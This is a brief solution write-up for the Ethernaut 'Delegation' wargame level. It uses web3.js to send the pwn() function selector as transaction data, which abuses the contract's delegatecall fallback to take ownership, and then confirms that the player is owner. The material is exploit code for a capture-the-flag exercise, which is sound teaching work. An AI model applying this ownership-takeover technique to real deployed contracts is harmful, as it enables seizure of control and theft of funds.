## Ethernaut-6 solution:

1. Get the method ID of the `pwn()` function:

```
const methodId = web3.eth.abi.encodeFunctionSignature('pwn()');
```
2. Send a transaction to the Delegation contract with this method ID as data:

```
await web3.eth.sendTransaction({
    to: contract.address,
    data: methodId,
    from: player,
    gas: 100000
});

```

3. Check if you're now the owner:

```
const newOwner = await contract.owner();
console.log('New owner:', newOwner);
console.log('Player address:', player);

```